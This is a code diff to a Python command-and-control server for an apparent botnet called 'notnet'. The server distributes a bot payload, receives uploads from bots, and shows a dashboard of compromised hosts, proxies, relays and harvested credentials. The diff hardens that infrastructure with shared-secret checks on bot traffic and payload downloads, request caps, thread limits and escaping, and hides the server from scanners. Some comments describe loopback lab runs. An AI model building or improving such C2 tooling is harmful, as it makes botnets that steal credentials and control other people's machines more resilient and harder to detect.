@@ -19,6 +19,7 @@ Incoming heartbeats with a WRONG secret are logged and never served commands.
 """
 
 import argparse
+import hmac
 import json
 import os
 import re
@@ -43,6 +44,13 @@ DEFAULT_PAYLOAD = 8443
 DEFAULT_WS = 8081
 DEFAULT_IRC = 6667
 DEFAULT_CONSOLE = 8090
+
+# Request-size caps (#165/#166/#183): a bot request is small JSON or a
+# PAYLOAD_MAX_SIZE (64KB) upload; anything larger is an attack or a bug.
+MAX_HTTP_REQUEST = 2 * 1024 * 1024        # total buffered bytes per request
+MAX_UPLOAD_BODY = 8 * 1024 * 1024         # upload body cap (128x payload max)
+MAX_WS_FRAME = 1024 * 1024                # WS frame payload cap
+UPLOAD_NAME_RE = re.compile(r"^[A-Za-z0-9._-]{1,128}$")
 
 _lock = threading.Lock()
 
@@ -274,11 +282,19 @@ def recv_http(conn):
 
     Returns (method, path, body, headers) or None on close. `headers` is a
     lower-cased dict of the request headers (used for Content-Type routing
-    of uploads, #134)."""
+    of uploads, #134).
+
+    #165: total buffered bytes are capped at MAX_HTTP_REQUEST and an
+    oversized declared Content-Length is rejected up front, so a client
+    cannot grow the buffer without bound (slowloris with huge headers or
+    a giant body)."""
     conn.settimeout(30)
     buf = b""
     try:
         while True:
+            if len(buf) > MAX_HTTP_REQUEST:
+                log(f"HTTP request exceeds {MAX_HTTP_REQUEST} bytes — dropped")
+                return None
             chunk = conn.recv(8192)
             if not chunk:
                 return None
@@ -310,6 +326,9 @@ def recv_http(conn):
                             clen = int(v.strip())
                         except ValueError:
                             clen = 0
+                if clen > MAX_HTTP_REQUEST:
+                    log(f"HTTP Content-Length {clen} exceeds cap — dropped")
+                    return None
                 if len(rest) < clen:
                     break  # need more body bytes
                 body = rest[:clen]
@@ -355,13 +374,26 @@ def http_send_file(conn, path, ctype):
         pass
 
 
-def _ingest_upload(c2, body, ip, path):
+def _ingest_upload(c2, body, ip, path, secret_ok=False):
     """Persist an uploaded file from the bot (#134).
 
     Writes the raw bytes to <payload_dir>/uploads/<ts>-<ip>.bin and logs
     the receipt (size + source). Previously these POSTs were acked and
-    dropped. Returns the saved path or None."""
+    dropped. Returns the saved path or None.
+
+    #164: uploads now REQUIRE the shared secret (secret_ok=True — the
+    caller checks the X-Notnet-Secret header) and a body size cap.
+    #183: an explicit /upload/<name> name must match a safe charset, so a
+    crafted URL can never escape uploads/ or smuggle odd filenames."""
+    if not secret_ok:
+        c2.state.add_event("auth_fail", f"upload without secret from {ip}")
+        log(f"UPLOAD REJECT {ip} (no secret)")
+        return None
     if not body:
+        return None
+    if len(body) > MAX_UPLOAD_BODY:
+        c2.state.add_event("upload_reject", f"{len(body)} bytes from {ip} exceeds cap")
+        log(f"UPLOAD REJECT {ip} {len(body)} bytes (over {MAX_UPLOAD_BODY})")
         return None
     up_dir = os.path.join(c2.payload_dir, "uploads")
     try:
@@ -370,11 +402,20 @@ def _ingest_upload(c2, body, ip, path):
         pass
     ts = int(time.time() * 1000)
     # basename of an explicit /upload/<name> if present, else ip timestamp
-    name = os.path.basename(path.rstrip("/")) if path.endswith("/upload") \
+    name = os.path.basename(path.rstrip("/")) if path.endswith("/upload") or "/upload/" in path \
         else f"upload-{ts}-{ip.replace('.', '_')}.bin"
     if not name or name == "upload":
         name = f"upload-{ts}-{ip.replace('.', '_')}.bin"
+    # #183: only a safe charset survives; anything else falls back to the
+    # generated name (never a 4xx — the bot treats non-2xx as failure).
+    if not UPLOAD_NAME_RE.match(name):
+        log(f"UPLOAD {ip}: unsafe name {name!r} — using generated name")
+        name = f"upload-{ts}-{ip.replace('.', '_')}.bin"
     dest = os.path.join(up_dir, name)
+    # Defense in depth: the join must still resolve inside up_dir.
+    if os.path.dirname(os.path.abspath(dest)) != os.path.abspath(up_dir):
+        log(f"UPLOAD REJECT {ip}: path escape attempt {name!r}")
+        return None
     try:
         with open(dest, "wb") as f:
             f.write(body)
@@ -387,6 +428,31 @@ def _ingest_upload(c2, body, ip, path):
         return None
 
 
+def _request_secret_ok(c2, headers, j):
+    """#164/#167: shared-secret check for non-heartbeat requests.
+
+    Accepts the secret from (in order): the X-Notnet-Secret header, the
+    ?secret= query param, or the JSON body's "secret" field. Constant-time
+    compare. The bot's http_upload/http_post are updated to send the
+    header; the query/body forms keep older bots working."""
+    supplied = (headers.get("x-notnet-secret")
+                or _query_param(headers.get("http-target-path", ""), "secret")
+                or (j.get("secret") if isinstance(j, dict) else "")
+                or "")
+    return hmac.compare_digest(str(supplied), str(c2.secret))
+
+
+def _query_param(path, key):
+    """Extract one query param from a raw request path (no decode needed —
+    the secret charset is URL-safe)."""
+    q = path.split("?", 1)[1] if "?" in path else ""
+    for part in q.split("&"):
+        k, _, v = part.partition("=")
+        if k == key:
+            return v
+    return ""
+
+
 def handle_http(conn, addr, c2):
     ip = addr[0]
     try:
@@ -395,7 +461,10 @@ def handle_http(conn, addr, c2):
             if req is None:
                 return
             method, path, body, headers = req
-            path = path.rstrip("/")
+            # keep the raw path (with query) for param extraction, strip
+            # the query for routing
+            raw_path = path
+            path = path.split("?", 1)[0].rstrip("/")
             ctype = (headers.get("content-type") or "").lower()
             text = body.decode("utf-8", errors="replace")
             try:
@@ -408,12 +477,13 @@ def handle_http(conn, addr, c2):
             # default remote path is the heartbeat path, so an octet-stream
             # POST there is an upload, NOT a command response (those are
             # JSON). Explicit `upload <f> /upload` (or any http:// URL with
-            # path /upload) hits the dedicated route below. Both persist the
-            # bytes — previously they were acked and silently dropped.
+            # path /upload) hits the dedicated route below.
+            # #164: uploads REQUIRE the shared secret now (header or ?secret=).
             if method == "POST" and (
                     (path == c2.http_path.rstrip("/") and "octet-stream" in ctype)
-                    or path.endswith("/upload")):
-                _ingest_upload(c2, body, ip, path)
+                    or path.endswith("/upload") or "/upload/" in path):
+                _ingest_upload(c2, body, ip, raw_path,
+                               secret_ok=_request_secret_ok(c2, headers, j))
                 http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                 continue
 
@@ -421,12 +491,21 @@ def handle_http(conn, addr, c2):
                 kind = "heartbeat" if j.get("cmd") == "status" else "response"
                 secret = j.get("secret", "")
                 # Secret is verified on HEARTBEATS only — the bot's command
-                # responses ({"cmd":...,"result":...}) do NOT carry the
-                # secret. Treat them like the mock does: ack + log.
+                # responses do NOT carry a body secret; they authenticate via
+                # _request_secret_ok below (header / ?secret= / body field).
                 if kind == "heartbeat" and secret != c2.secret:
                     c2.state.add_event("auth_fail",
                                        f"bad secret from {ip} host={j.get('hostname','')}")
                     log(f"AUTH-FAIL {ip} host={j.get('hostname','')}")
+                    http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+                    continue
+                # #167: command responses used to be stored with zero auth —
+                # any host could upsert fake bot rows and inject evidence
+                # lines. Now they must carry the secret (header or body).
+                if kind != "heartbeat" and not _request_secret_ok(c2, headers, j):
+                    c2.state.add_event("auth_fail",
+                                       f"response without secret from {ip}")
+                    log(f"RESP-REJECT {ip} (no secret)")
                     http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                     continue
                 c2.state.upsert_bot(j, ip, "http")
@@ -457,18 +536,27 @@ def handle_http(conn, addr, c2):
                 http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
                 continue
 
-            if method == "GET" and path == "/bot/notnet":
-                http_send_file(conn, os.path.join(c2.payload_dir, "notnet"),
-                               "application/octet-stream")
-                log(f"PAYLOAD notnet download from {ip}")
-                c2.ev(f"C2 PAYLOAD download from {ip}")
-                continue
-            if method == "GET" and path == "/notnet-src.tar":
-                http_send_file(conn, os.path.join(c2.payload_dir, "notnet-src.tar"),
-                               "application/x-tar")
-                log(f"SRC-TAR download from {ip}")
-                continue
-            if method == "GET" and path.startswith("/bot/"):
+            # #173: payload + source-tarball downloads now require the
+            # shared secret (?secret= on the URL, matching the bot's
+            # http_get_url which appends it). Unauthenticated GETs get the
+            # generic ok-ack so scanners learn nothing.
+            if method == "GET" and (path == "/bot/notnet" or path == "/notnet-src.tar"
+                                    or path.startswith("/bot/")):
+                if not _request_secret_ok(c2, headers, {}):
+                    log(f"PAYLOAD REJECT {ip} (no secret)")
+                    http_send(conn, json.dumps({"status": "ok", "secret": c2.secret}))
+                    continue
+                if path == "/bot/notnet":
+                    http_send_file(conn, os.path.join(c2.payload_dir, "notnet"),
+                                   "application/octet-stream")
+                    log(f"PAYLOAD notnet download from {ip}")
+                    c2.ev(f"C2 PAYLOAD download from {ip}")
+                    continue
+                if path == "/notnet-src.tar":
+                    http_send_file(conn, os.path.join(c2.payload_dir, "notnet-src.tar"),
+                                   "application/x-tar")
+                    log(f"SRC-TAR download from {ip}")
+                    continue
                 fname = os.path.basename(path)
                 full = os.path.join(c2.payload_dir, fname)
                 if os.path.isfile(full):
@@ -507,8 +595,7 @@ def serve_http(c2, port):
                     except OSError:
                         pass
                     continue
-            threading.Thread(target=handle_http, args=(conn, addr, c2),
-                             daemon=True).start()
+            _spawn_conn_thread(handle_http, conn, addr, c2)
         except KeyboardInterrupt:
             break
 
@@ -567,6 +654,9 @@ def ws_recv_exact(conn, n):
 
 
 def ws_read_frame(conn):
+    """Read one WS frame. #166: frames above MAX_WS_FRAME are rejected
+    (returns (0, b"")) instead of allocating whatever the 64-bit length
+    claims — a client could otherwise stream multi-GB frames slowly."""
     hdr = ws_recv_exact(conn, 2)
     opcode = hdr[0] & 0x0F
     masked = (hdr[1] >> 7) & 1
@@ -575,6 +665,9 @@ def ws_read_frame(conn):
         plen = int.from_bytes(ws_recv_exact(conn, 2), "big")
     elif plen == 127:
         plen = int.from_bytes(ws_recv_exact(conn, 8), "big")
+    if plen > MAX_WS_FRAME:
+        log(f"WS frame {plen} bytes exceeds cap — dropped")
+        return 0, b""
     mask = ws_recv_exact(conn, 4) if masked else b""
     payload = ws_recv_exact(conn, plen)
     if mask:
@@ -635,6 +728,10 @@ def handle_ws(conn, addr, c2):
                         c2.ev(f"WS SERVE {out}")
                         ws_send_text(conn, out)
                         continue
+            elif j and not _request_secret_ok(c2, {}, j):
+                # #167: non-heartbeat WS frames (bot responses) used to be
+                # logged/ev'd with zero auth — same injection gap as HTTP.
+                log(f"WS RESP-REJECT {ip} (no secret)")
             ws_send_text(conn, json.dumps({"status": "ok", "secret": c2.secret}))
     except (socket.timeout, ConnectionError, OSError):
         pass
@@ -654,8 +751,7 @@ def serve_ws(c2, port):
     while True:
         try:
             conn, addr = srv.accept()
-            threading.Thread(target=handle_ws, args=(conn, addr, c2),
-                             daemon=True).start()
+            _spawn_conn_thread(handle_ws, conn, addr, c2)
         except KeyboardInterrupt:
             break
 
@@ -805,9 +901,7 @@ def serve_irc(c2, port, nick, channel):
     while True:
         try:
             conn, addr = srv.accept()
-            threading.Thread(target=handle_irc,
-                             args=(conn, addr, c2, nick, channel),
-                             daemon=True).start()
+            _spawn_conn_thread(handle_irc, conn, addr, c2, nick, channel)
         except KeyboardInterrupt:
             break
 
@@ -850,16 +944,17 @@ class ConsoleHandler(BaseHTTPRequestHandler):
         tok = self.c2.console_token
         if not tok:
             return True, None
-        # Bearer header
+        # Bearer header — #168: constant-time compare (timing oracle)
         auth = self.headers.get("Authorization", "")
-        if auth.startswith("Bearer ") and auth[len("Bearer "):] == tok:
+        if auth.startswith("Bearer ") and hmac.compare_digest(
+                auth[len("Bearer "):], tok):
             return True, None
         # ?token= param (dashboard form + c2ctl)
         q = self.path.split("?", 1)
         if len(q) == 2:
             from urllib.parse import parse_qs
             params = parse_qs(q[1])
-            if params.get("token", [""])[0] == tok:
+            if hmac.compare_digest(params.get("token", [""])[0], tok):
                 return True, None
         return False, None
 
@@ -961,25 +1056,28 @@ def console_html():
 <th>at</th></tr></thead><tbody></tbody></table>
 <script>
 async function j(u){const r=await fetch(u);return r.json()}
+function esc(s){const d=document.createElement('div');d.textContent=(s==null?'':String(s));return d.innerHTML}
 async function refresh(){
  const b=await j('/api/bots');const tb=document.querySelector('#bots tbody');
  tb.innerHTML='';for(const x of b.bots){const tr=document.createElement('tr');
  const up=x.ago<90;const cls=up?'up':'stale';
- tr.innerHTML=`<td>${x.hostname}</td><td>${x.tag||''}</td><td>${x.ip||''}</td>
- <td>${x.version||''}</td><td>${x.uptime||0}</td><td>${x.scan_count||0}</td>
- <td>${x.cred_count||0}</td><td>${x.proxy_on?'<span class="ok">on '+x.proxy_port+'</span>':'off'}</td>
- <td>${x.relay_on?'<span class="ok">on '+x.relay_port+'</span>':'off'}</td>
- <td>${x.channel||''}</td><td class="${cls}">${x.ago}</td>`;
+ // #177: every bot-supplied field goes through esc() — hostname/tag/ip
+ // come from unauthenticated-ish heartbeats and must never hit innerHTML raw.
+ tr.innerHTML=`<td>${esc(x.hostname)}</td><td>${esc(x.tag||'')}</td><td>${esc(x.ip||'')}</td>
+ <td>${esc(x.version||'')}</td><td>${x.uptime||0}</td><td>${x.scan_count||0}</td>
+ <td>${x.cred_count||0}</td><td>${x.proxy_on?'<span class="ok">on '+esc(x.proxy_port)+'</span>':'off'}</td>
+ <td>${x.relay_on?'<span class="ok">on '+esc(x.relay_port)+'</span>':'off'}</td>
+ <td>${esc(x.channel||'')}</td><td class="${cls}">${x.ago}</td>`;
  tb.appendChild(tr);}
  const c=await j('/api/commands');const tc=document.querySelector('#cmds tbody');
  tc.innerHTML='';for(const x of c.commands){const tr=document.createElement('tr');
- tr.innerHTML=`<td>${x[0]}</td><td>${x[1]||''}</td><td>${x[2]}</td>
- <td>${x[3]||''}</td><td>${Math.round(x[4])}</td>
- <td>${x[5]?Math.round(x[5]):''}</td><td>${x[6]||''}</td>`;
+ tr.innerHTML=`<td>${x[0]}</td><td>${esc(x[1]||'')}</td><td>${esc(x[2])}</td>
+ <td>${esc(x[3]||'')}</td><td>${Math.round(x[4])}</td>
+ <td>${x[5]?Math.round(x[5]):''}</td><td>${esc(x[6]||'')}</td>`;
  tc.appendChild(tr);}
  const cr=await j('/api/creds');const tg=document.querySelector('#creds tbody');
  tg.innerHTML='';for(const x of cr.creds){const tr=document.createElement('tr');
- tr.innerHTML=`<td>${x[0]}</td><td>${x[1]}</td><td>${x[2]||''}</td><td>${Math.round(x[3])}</td>`;
+ tr.innerHTML=`<td>${x[0]}</td><td>${esc(x[1])}</td><td>${esc(x[2]||'')}</td><td>${Math.round(x[3])}</td>`;
  tg.appendChild(tr);}
 }
 document.querySelector('#qform').addEventListener('submit',async e=>{
@@ -1003,6 +1101,33 @@ def serve_console(c2, port, bind="127.0.0.1"):
 
 
 # ─────────────────────────── entrypoint ───────────────────────────
+
+# #187: bound concurrent connection threads per listener (the bot-side
+# proxy/relay got caps in #89/#91; the C2 never did). A semaphore-based
+# counter rejects over-cap accepts instead of spawning unbounded threads.
+MAX_CONN_THREADS = 128
+_conn_sem = threading.BoundedSemaphore(MAX_CONN_THREADS)
+
+
+def _spawn_conn_thread(target, conn, *args):
+    """Run target(conn, *args) in a thread if under the cap, else close."""
+    if not _conn_sem.acquire(blocking=False):
+        try:
+            conn.close()
+        except OSError:
+            pass
+        return
+    def _run():
+        try:
+            target(conn, *args)
+        finally:
+            try:
+                conn.close()
+            except OSError:
+                pass
+            _conn_sem.release()
+    threading.Thread(target=_run, daemon=True).start()
+
 
 class C2:
     def __init__(self, secret, http_path, queue_dir, payload_dir, state_path,
@@ -1091,6 +1216,17 @@ def main():
         log("REFUSING to bind unauthenticated console on "
             f"{args.console_bind} (set --console-token or use 127.0.0.1). #136")
         sys.exit(2)
+
+    # #172: the compile-time default secret must never guard a fleet that
+    # listens on 0.0.0.0. Loopback-only lab runs may keep it.
+    if args.secret == DEFAULT_SECRET:
+        exposed = any(p != 0 for p in (args.http_port, args.payload_port,
+                                       args.ws_port, args.irc_port))
+        if exposed:
+            log("REFUSING to start with the default secret on exposed "
+                "listeners — set --secret or NOTNET_C2_SECRET. #172")
+            sys.exit(2)
+        log("WARNING: default secret in use (loopback lab only). #172")
 
     c2 = C2(args.secret, args.http_path, args.queue_dir, args.payload_dir, args.db,
             console_token=args.console_token)
